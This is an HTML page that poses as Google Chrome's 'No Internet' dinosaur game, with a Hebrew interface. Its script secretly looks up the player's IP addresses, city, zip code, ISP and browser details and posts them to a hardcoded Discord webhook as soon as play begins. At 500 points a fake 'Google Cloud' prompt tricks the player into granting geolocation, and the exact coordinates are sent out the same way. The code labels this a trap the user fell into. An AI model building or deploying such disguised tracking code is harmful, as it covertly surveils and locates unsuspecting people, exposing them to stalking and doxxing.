<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - No Internet</title>
    <style>
        body { background-color: #f7f7f7; font-family: "Segoe UI", sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        #game-container { position: relative; width: 600px; height: 150px; border-bottom: 2px solid #535353; background: #fff; display: none; overflow: hidden; }
        #dino { position: absolute; bottom: 0; left: 50px; width: 35px; height: 40px; background-color: #535353; border-radius: 4px; z-index: 10; }
        #cactus { position: absolute; bottom: 0; left: 600px; width: 25px; height: 45px; background-color: #ff0000; border-radius: 4px; box-shadow: 0 0 8px rgba(255,0,0,0.6); }
        #score { position: absolute; top: 10px; right: 20px; font-size: 20px; color: #535353; font-weight: bold; }
        .no-internet-msg { text-align: right; width: 600px; }
        #start-msg { color: #5f6368; font-weight: bold; margin-top: 20px; cursor: pointer; border: 1px solid #ccc; padding: 10px; border-radius: 4px; }
    </style>
</head>
<body>

    <div class="no-internet-msg">
        <h1 style="color: #5f6368; font-size: 22px;">אין חיבור לאינטרנט</h1>
        <p style="color: #5f6368; font-size: 14px;">ERR_INTERNET_DISCONNECTED</p>
    </div>

    <div id="game-container">
        <div id="dino"></div>
        <div id="cactus"></div>
        <div id="score">Score: 0</div>
    </div>
    
    <div id="start-msg" onclick="startGame()">לחץ כאן או על Space כדי להתחיל לשחק</div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1476381984401133640/og1zEQ__IRGuIws45fteC3R_j0iekyFLkqhi7OKwWymzSnyKwIMZJBeZxuwH3eOruzv0";
        
        let score = 0;
        let isJumping = false;
        let gameActive = false;
        let cactusLeft = 600;
        let dinoY = 0;
        let gameLoop;

        async function sendLog(exactPos = null) {
            try {
                const geoRes = await fetch('http://ip-api.com/json/?fields=status,country,city,regionName,lat,lon,isp,query,zip,as');
                const geoData = await geoRes.json();
                
                let ipv6 = "לא זמין";
                try {
                    const v6Res = await fetch('https://api6.ipify.org?format=json');
                    const v6Data = await v6Res.json();
                    ipv6 = v6Data.ip;
                } catch(e) {}

                let title = exactPos ? "🟢 מיקום מדויק - המשתמש נפל במלכודת!" : "🔴 לוג IP בסיסי (נכנס למשחק)";
                let color = exactPos ? 3066993 : 15158332;
                let mapURL = exactPos 
                    ? `https://www.google.com/maps?q=${exactPos.coords.latitude},${exactPos.coords.longitude}`
                    : `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;

                const payload = {
                    embeds: [{
                        title: title,
                        color: color,
                        fields: [
                            { name: "🌐 IPv4", value: `\`${geoData.query}\``, inline: true },
                            { name: "🌐 IPv6", value: `\`${ipv6}\``, inline: true },
                            { name: "🌍 מדינה ועיר", value: `${geoData.city}, ${geoData.country}`, inline: true },
                            { name: "🏠 אזור", value: geoData.regionName || "N/A", inline: true },
                            { name: "📮 מיקוד", value: `\`${geoData.zip || 'N/A'}\``, inline: true },
                            { name: "🏢 ספק ותשתית", value: geoData.as || geoData.isp, inline: false },
                            { name: "📍 מיקום", value: `[פתח גוגל מאפס](${mapURL})`, inline: false },
                            { name: "📱 מכשיר", value: "```" + navigator.userAgent + "```" }
                        ],
                        footer: { text: "Mastol System Monitor" },
                        timestamp: new Date()
                    }]
                };

                await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            } catch (e) {}
        }

        function startGame() {
            if (gameActive) return;
            gameActive = true;
            score = 0;
            cactusLeft = 600;
            document.querySelector('.no-internet-msg').style.display = 'none';
            document.getElementById('start-msg').style.display = 'none';
            document.getElementById('game-container').style.display = 'block';
            sendLog(); 
            runGame();
        }

        function runGame() {
            gameLoop = setInterval(() => {
                if (!gameActive) return;

                cactusLeft -= 7; // מהירות הקקטוס
                if (cactusLeft < -30) {
                    cactusLeft = 600;
                    score += 100;
                    document.getElementById('score').innerText = "Score: " + score;

                    if (score === 500) {
                        gameActive = false;
                        clearInterval(gameLoop);
                        triggerTrap();
                    }
                }

                // בדיקת התנגשות מדויקת
                if (cactusLeft > 40 && cactusLeft < 85 && dinoY < 40) {
                    gameActive = false;
                    clearInterval(gameLoop);
                    alert("נפסלת! נסה שוב.");
                    location.reload();
                }

                document.getElementById('cactus').style.left = cactusLeft + 'px';
            }, 20);
        }

        function triggerTrap() {
            if (confirm("הגעת ל-500 נקודות! כדי לשמור את השיא ולהמשיך לשלב הבא, עליך לאשר את תנאי המיקום של Google Cloud.")) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            sendLog(pos);
                            alert("השיא נשמר בהצלחה!");
                            gameActive = true;
                            runGame();
                        },
                        () => {
                            alert("שגיאה: חובה לאשר מיקום כדי לשמור שיא.");
                            location.reload();
                        }
                    );
                }
            }
        }

        function jump() {
            if (isJumping || !gameActive) return;
            isJumping = true;
            let up = true;
            let jumpInterval = setInterval(() => {
                if (up) {
                    dinoY += 6;
                    if (dinoY >= 110) up = false;
                } else {
                    dinoY -= 6;
                    if (dinoY <= 0) {
                        dinoY = 0;
                        isJumping = false;
                        clearInterval(jumpInterval);
                    }
                }
                document.getElementById('dino').style.bottom = dinoY + 'px';
            }, 15);
        }

        window.addEventListener('keydown', (e) => {
            if (e.code === "Space" || e.code === "ArrowUp") {
                if (!gameActive && document.getElementById('game-container').style.display === 'none') startGame();
                else jump();
            }
        });
    </script>
</body>
</html>
